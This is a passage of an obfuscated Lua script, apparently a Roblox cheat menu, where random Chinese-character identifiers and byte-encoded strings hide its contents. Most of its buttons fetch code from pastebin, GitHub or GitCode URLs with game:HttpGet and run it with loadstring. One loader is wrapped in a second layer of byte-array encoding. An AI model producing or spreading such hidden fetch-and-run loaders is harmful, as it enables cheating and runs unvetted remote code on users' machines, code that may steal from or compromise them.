            table.insert(醴鬪伦飽眃親浜郇, s.曟諭郞恬夛塮頻秐)
        end
        熱喫盥嫚杮歡傱萌(utf8.char(33050, 26412, 21015, 34920), utf8.char(20849, 32) .. #醴鬪伦飽眃親浜郇 .. utf8.char(32, 20010, 33050, 26412), 3)
    end,
})

笘矇袓檯噩餮淨度:Divider()

-- 圣奥里
笘矇袓檯噩餮淨度:Button({
    Title = utf8.char(22307, 22885, 37324),
    Callback = function()
        pcall(function()
            loadstring(game:HttpGet(utf8.char(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 98, 105, 110, 46, 99, 111, 109, 47, 114, 97, 119, 47, 51, 85, 57, 87, 116, 81, 71, 85)))()
        end)
        熱喫盥嫚杮歡傱萌(utf8.char(22307, 22885, 37324), utf8.char(24050, 25191, 34892, 22307, 22885, 37324, 33050, 26412), 3)
    end,
})

--========================================================
-- 其他脚本
--========================================================
local 搒獋罳披糽姦橱谛 = 瀣梃羢鹟夠伪誥璲:Tab({Title = utf8.char(20854, 20182, 33050, 26412), Icon = utf8.char(102, 105, 108, 101, 45, 116, 101, 120, 116)})

搒獋罳披糽姦橱谛:Button({
    Title = utf8.char(24773, 20113, 33050, 26412),
    Callback = function()
        pcall(function()
            loadstring(utf8.偬冬摤秃猣帖鑠賰((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,67,104,105,110,97,81,89,47,45,47,109,97,105,110,47,37,69,54,37,56,51,37,56,53,37,69,52,37,66,65,37,57,49,34,41,41,40,41})end)()))()
        end)
        熱喫盥嫚杮歡傱萌(utf8.char(24773, 20113, 33050, 26412), utf8.char(24050, 25191, 34892, 24773, 20113, 33050, 26412), 3)
    end,
})

搒獋罳披糽姦橱谛:Button({
    Title = utf8.char(22812, 33050, 26412),
    Callback = function()
        pcall(function()
            loadstring(game:HttpGet(utf8.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 121, 108, 116, 52, 49, 48, 47, 114, 111, 98, 108, 111, 120, 45, 83, 99, 114, 105, 112, 116, 47, 114, 101, 102, 115, 47, 104, 101, 97, 100, 115, 47, 109, 97, 105, 110, 47, 121, 101, 106, 105, 97, 111, 98, 101, 110)))()
        end)
        熱喫盥嫚杮歡傱萌(utf8.char(22812, 33050, 26412), utf8.char(24050, 25191, 34892, 22812, 33050, 26412), 3)
    end,
})

搒獋罳披糽姦橱谛:Button({
    Title = utf8.char(88, 65, 33050, 26412),
    Callback = function()
        pcall(function()
            loadstring(game:HttpGet(utf8.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 99, 111, 100, 101, 46, 99, 111, 109, 47, 88, 105, 110, 103, 116, 97, 105, 100, 117, 97, 110, 47, 83, 99, 114, 105, 112, 116, 115, 47, 114, 97, 119, 47, 109, 97, 105, 110, 47, 76, 111, 97, 100, 101, 114, 46, 108, 117, 97)))()
        end)
        熱喫盥嫚杮歡傱萌(utf8.char(88, 65, 33050, 26412), utf8.char(24050, 25191, 34892, 88, 65, 33050, 26412), 3)
    end,
})

搒獋罳披糽姦橱谛:Button({
    Title = utf8.char(30382, 33050, 26412),
    Callback = function()
        pcall(function()
            getgenv().XiaoPi = utf8.char(30382, 33050, 26412, 81, 81, 32676, 49, 48, 54, 53, 55, 50, 53, 48, 56, 54)
            loadstring(game:HttpGet(utf8.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 104, 117, 98, 117, 115, 101, 114, 99, 111, 110, 116, 101, 110, 116, 46, 99, 111, 109, 47, 120, 105, 97, 111, 112, 105, 55, 55, 47, 120, 105, 97, 111, 112, 105, 55, 55, 47, 109, 97, 105, 110, 47, 81, 81, 49, 48, 48, 50, 49, 48, 48, 48, 51, 50, 45, 82, 111, 98, 108, 111, 120, 45, 80, 105, 45, 115, 99, 114, 105, 112, 116, 46, 108, 117, 97)))()
        end)
        熱喫盥嫚杮歡傱萌(utf8.char(30382, 33050, 26412), utf8.char(24050, 25191, 34892, 30382, 33050, 26412), 3)
    end,
})

搒獋罳披糽姦橱谛:Button({
    Title = utf8.char(82, 79, 66, 33050, 26412),
    Callback = function()
        pcall(function()
            loadstring(game:HttpGet(utf8.char(104, 116, 116, 112, 115, 58, 47, 47, 114, 97, 119, 46, 103, 105, 116, 99, 111, 100, 101, 46, 99, 111, 109, 47, 82, 79, 66, 53, 50, 48, 49, 51, 49, 52, 47, 114, 111, 98, 115, 99, 114, 105, 112, 116, 47, 114, 97, 119, 47, 109, 97, 105, 110, 47, 82, 79, 66, 46, 86, 51)))()
        end)
        熱喫盥嫚杮歡傱萌(utf8.char(82, 79, 66, 33050, 26412), utf8.char(24050, 25191, 34892, 82, 79, 66, 33050, 26412), 3)
    end,
})

--=========== 启动 ===========
熱喫盥嫚杮歡傱萌(utf8.char(27426, 36814, 20351, 29992), utf8.char(115, 98, 114, 112, 33050, 26412), 5)
task.wait(1)
熱喫盥嫚杮歡傱萌(utf8.char(115, 98, 114, 112, 33050, 26412), utf8.char(118, 53, 46, 48, 32, 21152, 36733, 23436, 25104), 3)

)(...)